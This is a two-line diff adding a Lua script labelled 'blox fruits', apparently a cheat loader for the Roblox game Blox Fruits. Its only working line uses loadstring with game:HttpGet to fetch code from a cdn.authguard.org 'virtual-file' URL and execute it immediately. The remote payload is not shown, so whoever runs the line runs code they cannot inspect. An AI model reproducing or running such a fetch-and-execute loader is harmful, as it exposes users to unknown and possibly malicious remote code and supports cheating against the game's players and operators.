@@ -1,0 +1,2 @@
+-- blox fruits 
+loadstring(game:HttpGet("https://cdn.authguard.org/virtual-file/f2b48b2a447644e2a9f6954cf2b79340"))()
